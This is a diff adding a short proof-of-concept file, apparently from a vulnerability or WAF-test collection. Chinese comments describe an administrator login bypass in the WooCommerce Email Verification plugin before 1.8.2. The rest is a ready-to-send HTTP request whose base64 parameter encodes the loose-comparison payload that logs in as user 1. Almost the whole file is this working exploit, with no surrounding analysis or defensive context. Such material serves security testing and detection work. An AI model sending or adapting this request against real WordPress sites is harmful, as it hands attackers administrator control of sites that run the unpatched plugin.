@@ -1,0 +1,9 @@
+# Email Verification for WooCommerce 认证绕过漏洞
+# 1.8.2版本之前的Wordpress插件的邮件验证包含一个松散的比较问题，允许任何用户以管理员身份登录。
+GET /my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=&acid=80001480&bid=hd_tag_m8mv260p HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260p
+RM-PRO-Token: 8205b61bcd77f8655530ffa72603bce4
+RM-PRO-Time: 1742808520905
+User-Agent: curl/7.83.1
+
